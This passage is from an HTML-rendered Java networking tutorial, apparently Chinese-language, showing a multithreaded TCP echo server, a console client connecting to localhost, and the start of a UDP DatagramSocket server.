&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ServerSocket&lt;/span> &lt;span style="color:#111">ss&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ServerSocket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">6980&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Server is running...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ss&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">accept&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;connected from &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRemoteSocketAddress&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Thread&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Handler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Handler&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Handler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">ioe&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Client disconnected&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">writer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OutputStreamWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye~\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Socket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è¿æ¥æŒ‡å®šæœåŠ¡å™¨å’Œç«¯å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;disconnected.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">writer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OutputStreamWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">scanner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">in&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[server] &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;&amp;gt;&amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æ‰“å°æç¤º
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// è¯»å–ä¸€è¡Œè¾“å…¥
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;&amp;lt;&amp;lt; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„&lt;code>flush()&lt;/code>ï¼Œä¸ç„¶å¯èƒ½éƒ½æ”¶ä¸åˆ°æ¶ˆæ¯&lt;/p>
&lt;h3 id="socket---udp">Socket - UDP&lt;/h3>
&lt;p>Server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramSocket&lt;/span> &lt;span style="color:#111">ds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramSocket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// ç›‘å¬æŒ‡å®šç«¯å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// æ— é™å¾ªç¯
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// æ•°æ®ç¼“å†²åŒº:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">DatagramPacket&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">receive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æ”¶å–ä¸€ä¸ªUDPæ•°æ®åŒ…
